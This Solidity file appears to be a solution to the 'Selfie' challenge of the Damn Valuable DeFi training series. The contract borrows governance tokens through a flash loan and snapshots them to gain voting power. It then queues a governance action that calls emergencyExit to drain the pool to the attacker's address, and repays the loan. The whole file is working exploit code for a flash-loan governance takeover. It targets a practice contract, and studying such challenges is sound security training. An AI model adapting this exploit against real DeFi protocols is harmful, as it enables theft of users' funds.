// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";

contract SelfieAttacker is IERC3156FlashBorrower {
    SelfiePool private immutable pool;
    SimpleGovernance private immutable governance;
    DamnValuableTokenSnapshot private immutable asset;
    address public owner;

    error UnexpectedFlashLoan();

    constructor(
        address poolAddress,
        address assetAddress,
        address governanceAddress
    ) {
        pool = SelfiePool(poolAddress);
        asset = DamnValuableTokenSnapshot(assetAddress);
        governance = SimpleGovernance(governanceAddress);
        owner = msg.sender;
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {

        uint256 id = asset.snapshot();
        governance.queueAction(address(pool), 0, data);
        ERC20(token).approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeFlashLoan(uint256 amount) external {

        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            owner
        );

        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(asset),
            amount,
            data
        );
    }
}
